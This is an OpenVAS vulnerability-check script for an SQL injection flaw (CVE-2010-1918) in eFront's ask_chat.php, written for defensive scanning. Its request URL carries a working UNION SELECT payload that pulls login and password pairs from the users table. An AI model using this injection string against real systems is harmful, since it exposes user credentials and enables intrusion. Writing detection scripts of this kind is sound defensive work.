##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_efront_sql_inj_vuln.nasl 12392 2018-11-16 19:26:25Z cfischer $
#
# eFront 'ask_chat.php' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:efrontlearning:efront';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800778");
  script_version("$Revision: 12392 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-16 20:26:25 +0100 (Fri, 16 Nov 2018) $");
  script_tag(name:"creation_date", value:"2010-05-19 14:50:39 +0200 (Wed, 19 May 2010)");
  script_cve_id("CVE-2010-1918");
  script_bugtraq_id(40032);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("eFront 'ask_chat.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_efront_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efront/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view,
  add, modify or delete information in the back-end database.");

  script_tag(name:"affected", value:"eFront version 3.6.2 and prior.");

  script_tag(name:"insight", value:"The flaw exists due to an error in 'ask_chat.php', which fails
  to properly sanitise input data passed via the 'chatrooms_ID' parameter.");

  script_tag(name:"solution", value:"Upgrade to eFront 3.6.2 build 6551 or later.");
  script_tag(name:"summary", value:"This host is running eFront and is prone to SQL injection
  vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39728");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1101");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1005-exploits/MOPS-2010-018.pdf");
  script_xref(name:"URL", value:"http://www.efrontlearning.net/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/ask_chat.php?chatrooms_ID=0%20UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%20from%20users%20--%20x";

if( http_vuln_check( port:port, url:url, pattern:"0 UNION select concat\(login,0x2e,password\)", extra_check:"admin", check_header:TRUE ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );